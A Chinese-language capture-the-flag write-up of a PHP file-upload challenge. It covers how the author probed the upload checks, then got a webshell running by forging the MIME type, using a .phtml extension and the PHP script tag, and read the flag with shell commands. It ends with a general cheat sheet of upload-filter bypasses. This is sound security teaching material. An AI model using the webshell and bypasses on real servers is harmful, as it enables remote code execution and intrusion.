# CTF 文件上传题学案 —— "上传头像"（Syclover @ cl4y）

- 题目地址：http://b75c98a9a81088460b9b7636.http-ctf2.dasctf.com/
- 环境：openresty 前置 + PHP/5.5.9-1ubuntu4.29（Apache）
- FLAG：`CTF2{70b723bd-8165-442c-9581-077a22e15c8b}`

---

## 考点链条

```
伪造 Content-Type(MIME) → 后缀黑名单绕过(.phtml) → 内容关键字绕过(script标签) → RCE
```

---

## 第 0 步：信息收集

打开首页，页面标题"上传头像"，存在表单：

```html
<form action="upload_file.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
</form>
```

**结论**：文件上传点，后端处理脚本 `upload_file.php`。文件上传题的核心问题永远是——
服务端用什么规则判断"这个文件能不能传"？

---

## 第 1 步：确认服务器家底

响应头：

```
Server: openresty
X-Powered-By: PHP/5.5.9-1ubuntu4.29
```

线索：
- PHP 5.5 是 2014 年的老版本 → 一些新版本已废弃的语法还能用（后面用到 `<?` 的替代标签）
- Ubuntu + Apache → 联想到 `.phtml` / `.htaccess` 解析特性

> 划重点：**版本号永远要读**，它决定你能用哪些"老古董"技巧。

---

## 第 2 步：传一个合法图片，观察"成功的样子"

```bash
curl -s -F "file=@t.png" -F "submit=提交" http://target/upload_file.php
```

返回：`上传文件名: t.png`

试探存储路径：

```
t.png          => 404
upload/t.png   => 200   ← 找到了
uploads/t.png  => 404
```

**结论**：
- 文件原样存到 `upload/` 目录
- **文件名未重命名**（决定了能靠后缀做文章）

> 上传题三问：**存在哪？叫什么名字？怎么被解析？** 前两个已解决。

---

## 第 3 步：黑盒探测校验规则（最核心）

原则：**一次只改一个变量**。固定内容，只改后缀，看报错。

| 文件名 | 返回 |
|---|---|
| `a.jpg` | 上传成功 |
| `a.txt` | `Not image!` |
| `a.php` | `NOT！php!` |
| `a.php5` | `NOT！php5!` |
| `a.pht` | `NOT！pht!` |
| `a.phtml` | 上传成功 |

出现**三种不同报错** → 至少三层校验：
1. `Not image!` → 图片类型检查
2. `NOT！xxx!` → 后缀黑名单检查
3. `NO! HACKER! your file included '<?'` → 内容含 `<?` 拦截

### 关键分析：`Not image!` 查的到底是什么？

对照实验：**内容完全相同**（都带 `GIF89a` 头），只改后缀：

```
x1.jpg        => 成功
x3.gif        => 成功
x4.txt        => Not image!
x5.htaccess   => Not image!
x7.bmp        => Not image!
x10.jpg.php   => Not image!
x12.php.jpg   => 成功
```

内容一样、结果不同 → **它查的不是文件内容，而是后缀对应的 MIME**。

`x10.jpg.php` 失败、`x12.php.jpg` 成功，差别在最后一个后缀：
- `.php` → curl 发 `application/x-httpd-php` → 非 image → 拦截
- `.jpg` → curl 发 `image/jpeg` → 通过

**结论：MIME 校验用的是 `$_FILES['file']['type']`，该值由客户端发送，完全可伪造。**

> 划重点：凡是基于 `$_FILES[...]['type']` 的校验，等于没校验。

### 验证 MIME 可伪造

```bash
curl -F "file=@shell.php;type=image/png" ...
```

通过图片检查，进入下一层，报 `NOT！php!` → 第 1 层防线被证明是纸糊的。

---

## 第 4 步：摸清后缀黑名单范围

带 `type=image/png` 做后缀字典测试：

| 后缀 | 结果 | 说明 |
|---|---|---|
| `.php` `.php3` `.php4` `.php5` `.pht` | `NOT！xxx!` | 被黑名单拦截 |
| `.phtml` | 通过 | Apache 会当 PHP 执行 |
| `.php7` | 通过 | 黑名单没写它 |
| `.phps` `.inc` `.phar` `.shtml` `.htaccess` | 通过 | |
| `.php.jpg` | 通过 | 取最后一段后缀是 `.jpg` |
| `.jpg.php` | `NOT！php!` | 取最后一段后缀是 `.php` |

**结论**：
- 黑名单：`php, php3, php4, php5, pht`（大小写不敏感）
- 后端取**最后一个点后面的后缀**判断
- `.phtml` 不在黑名单里 ← 突破口

Ubuntu Apache + PHP 默认配置：

```apache
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

`.phtml` 正好命中 → 会被当作 PHP 解析执行，黑名单却漏了它。

---

## 第 5 步：绕过 `<?` 内容过滤

只剩内容过滤：只要含 `<?` 就报 HACKER。

普通标签 `<?php` 被封死。回到 PHP 5.5 的线索——支持 **script 标签**：

```php
<script language="php">
    system($_GET['c']);
</script>
```

**不含 `<?`**，骗过过滤，PHP 5.5 仍能解析（PHP 7 才删除）。

> 划重点：内容过滤只针对某几个字符串。不要想着"藏 `<?`"，而要想"**有没有等价写法**"。
> 等价标签、等价函数、编码、注释拆分，都是同一思路。
>
> 其他风格：
> - 短标签 `<?=`（含 `<?`，此题无效）
> - ASP 风格 `<% %>`（需 `asp_tags=On`）
> - script 标签最稳

---

## 第 6 步：组装 payload 并上传

三个绕过拼起来：

1. 伪造 MIME → `type=image/png`
2. 后缀 → `.phtml`（绕黑名单 + 可被 Apache 解析）
3. 内容 → `<script language="php">` 代替 `<?php`

文件内容：

```
GIF89a                            <script language="php">@system($_GET["c"]);</script>
```

上传：

```bash
curl -F 'file=@shell.phtml;type=image/png' -F 'submit=x' \
     http://target/upload_file.php
```

返回 `上传文件名: shell.phtml` → 成功。

---

## 第 7 步：访问 shell，读 flag

```bash
curl "http://target/upload/shell.phtml?c=id"
# GIF89a    uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://target/upload/shell.phtml?c=ls%20-al%20/"
# 根目录发现 /flag

curl "http://target/upload/shell.phtml?c=cat%20/flag"
# CTF2{70b723bd-8165-442c-9581-077a22e15c8b}
```

---

## 知识总结

### 每个考点对应一句"口诀"

| 防御手法 | 为什么没用 | 绕过方式 |
|---|---|---|
| 检查 `$_FILES['type']` | 该值由客户端发送，可任意伪造 | 请求里写 `Content-Type: image/png` |
| 后缀黑名单 `php/php5/pht...` | 漏掉了 Apache 可解析的 `.phtml` | 用 `.phtml` |
| 过滤内容里的 `<?` | 只堵了 PHP 默认标签 | 用 `<script language="php">` |

### 方法论（遇到新上传题可照做）

1. 读响应头，记版本号（PHP/Apache/Nginx）
2. 传合法文件，确认存哪、叫什么名字
3. **一次只改一个变量**试探：先只改后缀，再只改内容，再只改 MIME
4. 不同报错信息 = 指纹，反推有哪几层校验
5. 用"等价替换"绕过关键字过滤（标签、大小写、编码、注释、拼接）

> 一句话记住这题：**MIME 靠客户端、后缀漏了 phtml、内容只防 `<?`。三处全是软肋。**

### 常见上传绕过速查

- 前端校验 → 改前端 / 禁用 JS / 抓包改
- Content-Type 校验 → 抓包改成 `image/jpeg`
- 文件头校验（getimagesize）→ 加 `GIF89a` / 图片马
- 后缀黑名单 → 找漏网后缀（`phtml/phps/php7`）、大小写、双写、末尾点/空格、`::$DATA`
- 内容关键字 → 等价标签、大小写、注释拆分、拼接、编码
- `.htaccess`：`AddType application/x-httpd-php .jpg`
- `.user.ini`：`auto_prepend_file=xxx`
- 配合文件包含：日志包含、session 包含
